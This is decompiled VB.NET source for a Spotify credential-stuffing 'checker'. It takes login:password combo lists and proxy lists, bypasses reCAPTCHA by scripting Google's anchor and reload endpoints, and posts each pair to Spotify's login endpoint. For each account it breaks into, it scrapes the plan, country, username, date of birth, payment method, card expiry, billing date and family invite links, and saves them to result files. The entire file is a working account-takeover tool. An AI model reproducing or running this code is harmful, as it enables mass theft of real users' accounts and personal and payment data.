Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Security.Authentication
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Windows.Forms
Imports Extreme.Net
Imports Microsoft.VisualBasic.CompilerServices
Public Class Form1

	'#Region variabel
	Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

	Private Shared int_0 As Integer

	' Token: 0x04000074 RID: 116
	Private bool_0 As Boolean

	' Token: 0x04000075 RID: 117
	Private thread_0 As Thread

	' Token: 0x04000076 RID: 118
	Private Shared int_1 As Integer

	' Token: 0x04000077 RID: 119
	Public Shared indexacc As Integer = -1

	' Token: 0x04000078 RID: 120
	Private syncacc As Object

	' Token: 0x04000079 RID: 121
	Private syncfile As Object

	' Token: 0x0400007A RID: 122
	Private worck As Boolean

	' Token: 0x0400007B RID: 123
	Private IsFormBeingDragged As Boolean

	' Token: 0x0400007C RID: 124
	Private MouseDownX As Integer

	' Token: 0x0400007D RID: 125
	Private MouseDownY As Integer

	' Token: 0x0400007E RID: 126
	Private countryC As Dictionary(Of String, String)
	'#End Region
	Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

	End Sub

	Private Sub Checker(login As String, pass As String)
		Dim item As String = Conversions.ToString(1)
		Try
			Dim httpRequest As HttpRequest = New HttpRequest()
			Try
				Dim flag As Boolean = Operators.CompareString(Me.CBproxy.Text, "HTTP/s", False) = 0
				If flag Then
					httpRequest.Proxy = HttpProxyClient.Parse(Help.getProxy())
				End If
				flag = (Operators.CompareString(Me.CBproxy.Text, "SOCKS4", False) = 0)
				If flag Then
					httpRequest.Proxy = Socks4ProxyClient.Parse(Help.getProxy())
				End If
				flag = (Operators.CompareString(Me.CBproxy.Text, "SOCKS5", False) = 0)
				If flag Then
					httpRequest.Proxy = Socks5ProxyClient.Parse(Help.getProxy())
				End If
				flag = (Operators.CompareString(Me.CBproxy.Text, "IPVanish(SOCKS5)", False) = 0)
				If flag Then
					Dim proxy As String = Help.getProxy()
					Dim text As String = proxy.Split(New Char() {":"c})(0).Trim()
					Dim str As String = proxy.Split(New Char() {":"c})(1).Trim()
					Dim text2 As String = text + ":" + str
					Dim username As String = proxy.Split(New Char() {":"c})(2).Trim()
					Dim password As String = proxy.Split(New Char() {":"c})(3).Trim()
					Dim socks5ProxyClient As Socks5ProxyClient = Socks5ProxyClient.Parse(text)
					socks5ProxyClient.Username = username
					socks5ProxyClient.Password = password
					httpRequest.Proxy = socks5ProxyClient
				End If
				Dim left As String = ""
				While Operators.CompareString(left, "1", False) <> 0
					httpRequest.SslProtocols = SslProtocols.Tls12
					httpRequest.Cookies = New CookieDictionary(False)
					httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36")
					Dim input As String = httpRequest.[Get]("https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&v=iSHzt4kCrNgSxGUYDFqaZAL9&size=invisible&cb=q7o50gyglw4p", Nothing).ToString()
					Dim value As String = Regex.Match(input, "id=""recaptcha-token"" value=""(.*?)""").Groups(1).Value
					httpRequest.AddHeader("accept", "*/*")
					httpRequest.AddHeader("origin", "https://www.google.com")
					httpRequest.AddHeader("referer", httpRequest.Address.ToString())
					httpRequest.AddHeader("accept-language", "en-US,en;q=0.9,fa;q=0.8")
					Dim input2 As String = httpRequest.Post("https://www.google.com/recaptcha/api2/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39", String.Concat(New String() {"v=iSHzt4kCrNgSxGUYDFqaZAL9&reason=q&c=" + value + "&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!q62grYxHRvVxjUIjSFNd0mlvrZ-iCgIHAAAB6FcAAAANnAkBySdqTJGFRK7SirleWAwPVhv9-XwP8ugGSTJJgQ46-0IMBKN8HUnfPqm4sCefwxOOEURND35prc9DJYG0pbmg_jD18qC0c-lQzuPsOtUhHTtfv3--SVCcRvJWZ0V3cia65HGfUys0e1K-IZoArlxM9qZfUMXJKAFuWqZiBn-Qi8VnDqI2rRnAQcIB8Wra6xWzmFbRR2NZqF7lDPKZ0_SZBEc99_49j07ISW4X65sMHL139EARIOipdsj5js5JyM19a2TCZJtAu4XL1h0ZLfomM8KDHkcl_b0L-jW9cvAe2K2uQXKRPzruAvtjdhMdODzVWU5VawKhpmi2NCKAiCRUlJW5lToYkR_X-07AqFLY6qi4ZbJ_sSrD7fCNNYFKmLfAaxPwPmp5Dgei7KKvEQmeUEZwTQAS1p2gaBmt6SCOgId3QBfF_robIkJMcXFzj7R0G-s8rwGUSc8EQzT_DCe9SZsJyobu3Ps0-YK-W3MPWk6a69o618zPSIIQtSCor9w_oUYTLiptaBAEY03NWINhc1mmiYu2Yz5apkW_KbAp3HD3G0bhzcCIYZOGZxyJ44HdGsCJ-7ZFTcEAUST-aLbS-YN1AyuC7ClFO86CMICVDg6aIDyCJyIcaJXiN-bN5xQD_NixaXatJy9Mx1XEnU4Q7E_KISDJfKUhDktK5LMqBJa-x1EIOcY99E-eyry7crf3-Hax3Uj-e-euzRwLxn2VB1Uki8nqJQVYUgcjlVXQhj1X7tx4jzUb0yB1TPU9uMBtZLRvMCRKvFdnn77HgYs5bwOo2mRECiFButgigKXaaJup6NM4KRUevhaDtnD6aJ8ZWQZTXz_OJ74a_OvPK9eD1_5pTG2tUyYNSyz-alhvHdMt5_MAdI3op4ZmcvBQBV9VC2JLjphDuTW8eW_nuK9hN17zin6vjEL8YIm_MekB_dIUK3T1Nbyqmyzigy-Lg8tRL6jSinzdwOTc9hS5SCsPjMeiblc65aJC8AKmA5i80f-6Eg4BT305UeXKI3QwhI3ZJyyQAJTata41FoOXl3EF9Pyy8diYFK2G-CS8lxEpV7jcRYduz4tEPeCpBxU4O_KtM2iv4STkwO4Z_-c-fMLlYu9H7jiFnk6Yh8XlPE__3q0FHIBFf15zVSZ3qroshYiHBMxM5BVQBOExbjoEdYKx4-m9c23K3suA2sCkxHytptG-6yhHJR3EyWwSRTY7OpX_yvhbFri0vgchw7U6ujyoXeCXS9N4oOoGYpS5OyFyRPLxJH7yjXOG2Play5HJ91LL6J6qg1iY8MIq9XQtiVZHadVpZVlz3iKcX4vXcQ3rv_qQwhntObGXPAGJWEel5OiJ1App7mWy961q3mPg9aDEp9VLKU5yDDw1xf6tOFMwg2Q-PNDaKXAyP_FOkxOjnu8dPhuKGut6cJr449BKDwbnA9BOomcVSztEzHGU6HPXXyNdZbfA6D12f5lWxX2B_pobw3a1gFLnO6mWaNRuK1zfzZcfGTYMATf6d7sj9RcKNS230XPHWGaMlLmNxsgXkEN7a9PwsSVwcKdHg_HU4vYdRX6vkEauOIwVPs4dS7yZXmtvbDaX1zOU4ZYWg0T42sT3nIIl9M2EeFS5Rqms_YzNp8J-YtRz1h5RhtTTNcA5jX4N-xDEVx-vD36bZVzfoMSL2k85PKv7pQGLH-0a3DsR0pePCTBWNORK0g_RZCU_H898-nT1syGzNKWGoPCstWPRvpL9cnHRPM1ZKemRn0nPVm9Bgo0ksuUijgXc5yyrf5K49UU2J5JgFYpSp7aMGOUb1ibrj2sr-D63d61DtzFJ2mwrLm_KHBiN_ECpVhDsRvHe5iOx_APHtImevOUxghtkj-8RJruPgkTVaML2MEDOdL_UYaldeo-5ckZo3VHss7IpLArGOMTEd0bSH8tA8CL8RLQQeSokOMZ79Haxj8yE0EAVZ-k9-O72mmu5I0wH5IPgapNvExeX6O1l3mC4MqLhKPdOZOnTiEBlSrV4ZDH_9fhLUahe5ocZXvXqrud9QGNeTpZsSPeIYubeOC0sOsuqk10sWB7NP-lhifWeDob-IK1JWcgFTytVc99RkZTjUcdG9t8prPlKAagZIsDr1TiX3dy8sXKZ7d9EXQF5P_rHJ8xvmUtCWqbc3V5jL-qe8ANypwHsuva75Q6dtqoBR8vCE5xWgfwB0GzR3Xi_l7KDTsYAQIrDZVyY1UxdzWBwJCrvDrtrNsnt0S7BhBJ4ATCrW5VFPqXyXRiLxHCIv9zgo-NdBZQ4hEXXxMtbem3KgYUB1Rals1bbi8X8MsmselnHfY5LdOseyXWIR2QcrANSAypQUAhwVpsModw7HMdXgV9Uc-HwCMWafOChhBr88tOowqVHttPtwYorYrzriXNRt9LkigESMy1bEDx79CJguitwjQ9IyIEu8quEQb_-7AEXrfDzl_FKgASnnZLrAfZMtgyyddIhBpgAvgR_c8a8Nuro-RGV0aNuunVg8NjL8binz9kgmZvOS38QaP5anf2vgzJ9wC0ZKDg2Ad77dPjBCiCRtVe_dqm7FDA_cS97DkAwVfFawgce1wfWqsrjZvu4k6x3PAUH1UNzQUxVgOGUbqJsaFs3GZIMiI8O6-tZktz8i8oqpr0RjkfUhw_I2szHF3LM20_bFwhtINwg0rZxRTrg4il-_q7jDnVOTqQ7fdgHgiJHZw_OOB7JWoRW6ZlJmx3La8oV93fl1wMGNrpojSR0b6pc8SThsKCUgoY6zajWWa3CesX1ZLUtE7Pfk9eDey3stIWf2acKolZ9fU-gspeACUCN20EhGT-HvBtNBGr_xWk1zVJBgNG29olXCpF26eXNKNCCovsILNDgH06vulDUG_vR5RrGe5LsXksIoTMYsCUitLz4HEehUOd9mWCmLCl00eGRCkwr9EB557lyr7mBK2KPgJkXhNmmPSbDy6hPaQ057zfAd5s_43UBCMtI-aAs5NN4TXHd6IlLwynwc1zsYOQ6z_HARlcMpCV9ac-8eOKsaepgjOAX4YHfg3NekrxA2ynrvwk9U-gCtpxMJ4f1cVx3jExNlIX5LxE46FYIhQ"}), "application/x-www-form-urlencoded").ToString()
					Dim value2 As String = Regex.Match(input2, "rresp"",""(.*?)""").Groups(1).Value
					Dim text3 As String = httpRequest.[Get]("https://accounts.spotify.com/en/login", Nothing).ToString()
					Dim text4 As String = httpRequest.Cookies("csrf_token")
					Dim value3 As String = httpRequest.Cookies("__Host-device_id")
					Dim value4 As String = httpRequest.Cookies("__Secure-TPASESSION")
					httpRequest.Cookies.Add("sp_t", "576b5e3d-a565-47d4-94ce-0b6748fdc625")
					httpRequest.Cookies.Add("_gcl_au", "1.1.1585241231.1587921490")
					httpRequest.Cookies.Add("sp_adid", "fbe3a5fc-d8a3-4bc5-b079-3b1663ce0b49")
					httpRequest.Cookies.Add("_scid", "5eee3e0e-f16b-4f4c-bf73-188861f9fb0c")
					httpRequest.Cookies.Add("_hjid", "fb8648d2-549b-44c8-93e9-5bf00116b906")
					httpRequest.Cookies.Add("_fbp", "fb.1.1587921496365.773542932")
					httpRequest.Cookies.Remove("__Host-device_id")
					httpRequest.Cookies.Add("__Host-device_id", value3)
					httpRequest.Cookies.Add("cookieNotice", "true")
					httpRequest.Cookies.Add("sp_m", "us")
					httpRequest.Cookies.Add("spot", "=%7B%22t%22%3A1596548261%2C%22m%22%3A%22us%22%2C%22p%22%3Anull%7D")
					httpRequest.Cookies.Add("sp_last_utm", "%7B%22utm_campaign%22%3A%22alwayson_eu_uk_performancemarketing_core_brand%2Bcontextual-desktop%2Btext%2Bexact%2Buk-en%2Bgoogle%22%2C%22utm_medium%22%3A%22paidsearch%22%2C%22utm_source%22%3A%22uk-en_brand_contextual-desktop_text%22%7D")
					httpRequest.Cookies.Add("_gcl_dc", "GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB")
					httpRequest.Cookies.Add("_gcl_aw", "GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB")
					httpRequest.Cookies.Add("_gac_UA-5784146-31", "1.1596996518.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB")
					httpRequest.Cookies.Add("ki_t", "1597938645946%3B1599140931855%3B1599140931855%3B3%3B3")
					httpRequest.Cookies.Add("ki_r", "")
					httpRequest.Cookies.Add("optimizelyEndUserId", "oeu1599636139883r0.3283057902318758")
					httpRequest.Cookies.Add("optimizelySegments", "%7B%226174980032%22%3A%22search%22%2C%226176630028%22%3A%22none%22%2C%226179250069%22%3A%22false%22%2C%226161020302%22%3A%22gc%22%7D")
					httpRequest.Cookies.Add("optimizelyBuckets", "%7B%7D")
					httpRequest.Cookies.Add("sp_landingref", "https%3A%2F%2Fwww.google.com%2F")
					httpRequest.Cookies.Add("_gid", "GA1.2.2046705606.1599636143")
					httpRequest.Cookies.Add("_sctr", "1|1599634800000")
					httpRequest.Cookies.Add("sp_usid", "ceb6c24c-d1b4-4895-bcb7-e4e386afd063")
					httpRequest.Cookies.Add("sp_ab", "%7B%222019_04_premium_menu%22%3A%22control%22%7D")
					httpRequest.Cookies.Add("_pin_unauth", "dWlkPVlUQXdaV0UyTXprdE1EQmxOaTAwWlRCbUxUbGtNVGN0T0RVeE1ERTVNalEwTnpBMSZycD1abUZzYzJV")
					httpRequest.Cookies.Remove("__Secure-TPASESSION")
					httpRequest.Cookies.Add("__Secure-TPASESSION", value4)
					httpRequest.Cookies.Add("__bon", "MHwwfC0yODU4Nzc4NjN8LTEyMDA2ODcwMjQ2fDF8MXwxfDE=")
					httpRequest.Cookies.Add("remember", login)
					httpRequest.Cookies.Add("OptanonAlertBoxClosed", "2020-09-09T18: 37:10.735Z")
					httpRequest.Cookies.Add("OptanonConsent", "isIABGlobal=false&datestamp=Wed+Sep+09+2020+11%3A37%3A11+GMT-0700+(Pacific+Daylight+Time)&version=6.5.0&hosts=&consentId=89714584-b320-4c03-bd3c-be011bfaba6d&interactionCount=1&landingPath=NotLandingPage&groups=t00%3A1%2Cs00%3A1%2Cf00%3A1%2Cm00%3A1&AwaitingReconsent=false&geolocation=US%3BNJ")
					httpRequest.Cookies.Remove("csrf_token")
					httpRequest.Cookies.Add("csrf_token", text4)
					httpRequest.Cookies.Add("_ga_S35RN5WNT2", "GS1.1.1599675929.1.1.1599676676.0")
					httpRequest.Cookies.Add("_ga", "GA1.2.1572440783.1597938634")
					httpRequest.Cookies.Add("_gat", "1")
					httpRequest.AddHeader("accept", "application/json, text/plain, */*")
					httpRequest.AddHeader("accept-encoding", "gzip, deflate, br")
					httpRequest.AddHeader("origin", "https://accounts.spotify.com")
					httpRequest.AddHeader("referer", "https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&_locale=en-AE")
					httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36")
					httpRequest.AddHeader("sec-fetch-site", "same-origin")
					httpRequest.AddHeader("sec-fetch-mode", "cors")
					httpRequest.AddHeader("sec-fetch-dest", "empty")
					Dim text5 As String = httpRequest.Post("https://accounts.spotify.com/login/password", String.Concat(New String() {String.Concat(New String() {"remember=true&continue=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&username=", login, "&password=", pass, "&recaptchaToken=", value2, "&csrf_token=", text4})}), "application/x-www-form-urlencoded").ToString()
					flag = text5.Contains("sult"":""ok"",""")
					If flag Then
						Dim num As Integer = Integer.Parse(Me.good.Text) + 1
						Me.good.Text = num.ToString()
						num = Integer.Parse(Me.chk.Text) + 1
						Me.chk.Text = num.ToString()
						Dim listViewItem As ListViewItem = New ListViewItem()
						listViewItem.Text = login
						listViewItem.SubItems.Add(pass)
						Me.ListView1.Items.Add(listViewItem)
						Directory.CreateDirectory("Result")
						Dim input3 As String = httpRequest.[Get]("https://www.spotify.com/us/api/account/overview/", Nothing).ToString()
						Dim value5 As String = Regex.Match(input3, """name"":""(.*?)""").Groups(1).Value
						Dim value6 As String = Regex.Match(input3, "Country"",""value"":""(.*?)""").Groups(1).Value
						Dim value7 As String = Regex.Match(input3, "Username"",""value"":""(.*?)""").Groups(1).Value
						Dim text6 As String = Regex.Match(input3, "Date of birth"",""value"":""(.*?)""").Groups(1).Value.Replace("\/", "/")
						flag = value5.Contains("Spotify Free")
						If flag Then
							num = Integer.Parse(Me.free.Text) + 1
							Me.free.Text = num.ToString()
							Dim listViewItem2 As ListViewItem = New ListViewItem()
							listViewItem2.Text = login
							listViewItem2.SubItems.Add(pass)
							listViewItem2.SubItems.Add(value7)
							listViewItem2.SubItems.Add(value5)
							listViewItem2.SubItems.Add(value6)
							listViewItem2.SubItems.Add(text6)
							Me.freeListView.Items.Add(listViewItem2)
							Me.TextBox1.Text = String.Concat(New String() {Me.TextBox1.Text, "----------<Spotify V1.0>---------- " & vbCrLf, login, ":", pass, vbCrLf & "Plan: ", value5, vbCrLf & "Country: ", value6, vbCrLf & "Username: ", value7, vbCrLf & "DOB: ", text6, vbCrLf})
							File.AppendAllText("Result\Free[" + Help.time + "].txt", String.Concat(New String() {String.Concat(New String() {"----------<Spotify V1.0>---------- " & vbCrLf, login, ":", pass, vbCrLf & "Plan: ", value5, vbCrLf & "Country: ", value6, vbCrLf & "Username: ", value7, vbCrLf & "DOB: ", text6, vbCrLf})}))
						Else
							num = Integer.Parse(Me.premium.Text) + 1
							Me.premium.Text = num.ToString()
							Dim value8 As String = Regex.Match(input3, "paymentMethod"":{""name"":""(.*?)""").Groups(1).Value
							Dim text7 As String = Regex.Match(input3, "expiry"":""(.*?),").Groups(1).Value.Replace("\/", "/")
							Dim text8 As String = Regex.Match(input3, "class=\\u0022recurring-date\\u0022\\u003E(.*?)\\u").Groups(1).Value.Replace("\/", "/")
							Dim input4 As String = httpRequest.[Get]("https://www.spotify.com/us/home-hub/api/v1/family/home/", Nothing).ToString()
							Dim value9 As String = Regex.Match(input4, "isChildAccount"":(.*?)}").Groups(1).Value
							Dim value10 As String = Regex.Match(input4, "homeId"":""(.*?)""").Groups(1).Value
							Dim value11 As String = Regex.Match(input4, "inviteToken"":""(.*?)""").Groups(1).Value
							Dim listViewItem3 As ListViewItem = New ListViewItem()
							listViewItem3.Text = login
							listViewItem3.SubItems.Add(pass)
							listViewItem3.SubItems.Add(value7)
							listViewItem3.SubItems.Add(value5)
							listViewItem3.SubItems.Add(value6)
							listViewItem3.SubItems.Add(text6)
							Me.premiumListView.Items.Add(listViewItem3)
							Me.TextBox1.Text = String.Concat(New String() {Me.TextBox1.Text, "----------<Spotify V1.0>---------- " & vbCrLf, login, ":", pass, vbCrLf & "Plan: ", value5, vbCrLf & "Country: ", value6, vbCrLf & "Username: ", value7, vbCrLf & "DOB: ", text6, vbCrLf & "Payment Method: ", value8, vbCrLf & "CC Expire At: ", text7, vbCrLf & "Next Billing Date: ", text8, vbCrLf & "isChildAccount: ", value9, vbCrLf & "Home ID: ", value10, vbCrLf})
							File.AppendAllText("Result\Premium[" + Help.time + "].txt", String.Concat(New String() {String.Concat(New String() {"----------<Spotify V1.0>---------- " & vbCrLf, login, ":", pass, vbCrLf & "Plan: ", value5, vbCrLf & "Country: ", value6, vbCrLf & "Username: ", value7, vbCrLf & "DOB: ", text6, vbCrLf & "Payment Method: ", value8, vbCrLf & "CC Expire At: ", text7, vbCrLf & "Next Billing Date: ", text8, vbCrLf & "isChildAccount: ", value9, vbCrLf & "Home ID: ", value10, vbCrLf})}))
							flag = (Operators.CompareString(value11, Nothing, False) <> 0)
							If flag Then
								Dim value12 As String = Regex.Match(input4, "maxCapacity"":(.*?),").Groups(1).Value
								Dim count As Integer = Regex.Matches(input4, "isChildAccount"":(.*?)}").Count
								Dim text9 As String = Conversions.ToString(count) + "/" + value12
								Dim text10 As String = String.Concat(New String() {"https://www.spotify.com/", value6.ToLower(), "/family/join/invite/", value11, "/"})
								Me.TextBox1.Text = String.Concat(New String() {Me.TextBox1.Text, "Invite Token: ", value11, vbCrLf & "Max Capacity: ", value12, vbCrLf & "Invites Left: ", text9, vbCrLf & "Invites Link: ", text10, vbCrLf})
								File.AppendAllText("Result\Premium[" + Help.time + "].txt", String.Concat(New String() {String.Concat(New String() {"Invite Token: ", value11, vbCrLf & "Max Capacity: ", value12, vbCrLf & "Invites Left: ", text9, vbCrLf & "Invites Link: ", text10, vbCrLf})}))
							End If
						End If
					End If
					left = "1"
				End While
			Finally
				Dim flag As Boolean = httpRequest IsNot Nothing
				If flag Then
					CType(httpRequest, IDisposable).Dispose()
				End If
			End Try
		Catch ex As HttpException
			Dim flag As Boolean = ex.Status = HttpExceptionStatus.ConnectFailure
			If flag Then
				Me.er.Text = Conversions.ToString(Integer.Parse(Me.er.Text) + 1)
				item = login + ":" + pass
				Class1.list_0.Add(item)
			End If
			flag = (ex.HttpStatusCode = HttpStatusCode.BadRequest)
			If flag Then
				Me.bad.Text = Conversions.ToString(Integer.Parse(Me.bad.Text) + 1)
				Me.chk.Text = Conversions.ToString(Integer.Parse(Me.chk.Text) + 1)
			End If
		End Try
	End Sub

	Private Sub Worker()
		' The following expression was wrapped in a checked-statement
		Form1.int_0 += 1
		While Me.bool_0
			Try
				Dim text As String = ""
				Dim login As String = ""
				Dim pass As String = ""
				Dim object_ As Object = Help.object_0
				ObjectFlowControl.CheckForSyncLockOnValueType(object_)
				Dim flag As Boolean = False
				Dim flag2 As Boolean
				Try
					Monitor.Enter(object_, flag)
					flag2 = (Class1.list_0.Count <> 0)
					If Not flag2 Then
						Me.bool_0 = False
						Exit Try
					End If
					text = Class1.list_0(0)
					Class1.list_0.RemoveAt(0)
				Finally
					flag2 = flag
					If flag2 Then
						Monitor.[Exit](object_)
					End If
				End Try
				flag2 = Not String.IsNullOrEmpty(text)
				If flag2 Then
					Dim flag3 As Boolean = text.Contains(";")
					If flag3 Then
						login = text.Split(New Char() {";"c})(0).Trim()
						pass = text.Split(New Char() {";"c})(1).Trim()
					End If
					flag3 = text.Contains(":")
					If flag3 Then
						login = text.Split(New Char() {":"c})(0).Trim()
						pass = text.Split(New Char() {":"c})(1).Trim()
					End If
					flag3 = (Form1.int_0 > Form1.int_1)
					If flag3 Then
						Me.bool_0 = False
					End If
					Me.Checker(login, pass)
				Else
					Thread.Sleep(900)
				End If
			Catch ex As Exception
			End Try
		End While
	End Sub

	Private Sub Guna2Button1_Click(sender As Object, e As EventArgs) Handles Guna2Button1.Click
		Try
			Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
			openFileDialog.Filter = "text|*.txt"
			Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
			If flag Then
				Class1.list_0.Clear()
				For Each item As String In File.ReadAllLines(openFileDialog.FileName)
					Class1.list_0.Add(item)
				Next
				Me.tcombo.Text = Conversions.ToString(Class1.list_0.Count)
				Form1.int_1 = Class1.list_0.Count
			End If
		Catch ex As Exception
		End Try
	End Sub

	Private Sub Guna2Button2_Click(sender As Object, e As EventArgs) Handles Guna2Button2.Click
		Try
			Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With {.Filter = "Proxy (*.txt)|*.txt"}
			Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
			If flag Then
				Class1.list_1.Clear()
				Class1.list_1.AddRange(File.ReadAllLines(openFileDialog.FileName))
				Me.tproxy.Text = Class1.list_1.Count.ToString()
			End If
		Catch ex As Exception
		End Try
	End Sub

	Private Sub Guna2Button3_Click(sender As Object, e As EventArgs) Handles Guna2Button3.Click
		Me.bool_0 = False
		Try
			For Each thread As Thread In Class1.list_2
				thread.Abort()
			Next
		Finally
			Dim enumerator As List(Of Thread).Enumerator
			CType(enumerator, IDisposable).Dispose()
		End Try
		'Me.Close()
	End Sub

	Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListView1.SelectedIndexChanged

	End Sub
End Class
